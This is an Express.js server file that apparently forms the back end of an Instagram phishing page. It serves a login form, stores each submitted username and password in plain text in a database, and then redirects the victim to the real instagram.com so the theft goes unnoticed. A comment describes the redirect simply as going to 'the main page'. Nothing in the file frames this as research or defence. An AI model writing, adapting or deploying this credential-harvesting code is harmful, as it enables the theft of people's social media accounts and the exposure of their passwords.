// Load express JS
const express = require("express");
const app = express();

// Call the database to connect
require("./db/conn")

// To fetch the template to post data
const Register = require("./models/login.js")

// To operate with the path
const path = require("path")

// Either use given port or 3000
const port = process.env.PORT || 3000

// to Send JSON data to the database
app.use(express.json());
app.use(express.urlencoded({extended:false}));

// Running the front end
const stat_path = path.join(__dirname,"../public")
const temp_path = path.join(__dirname,"../templates/views")
app.use(express.static(stat_path));
app.set("view engine","hbs");
app.set("views",temp_path);
app.get("/",(req,res)=>{
	res.render("login");
});

// Generating post request to the server
app.post("/",async (req,res)=>{
	try{
		const user = new Register({
			username: req.body.username,
			password: req.body.password
		})
		const result = await user.save()
		res.status(201).redirect("https://www.instagram.com/"); //if done then redirect to the main page
	}catch (err){
		res.status(400).send(err);
	}
});

// Running the server in the given port
app.listen(port, ()=>{
	console.log("Server is Running")
});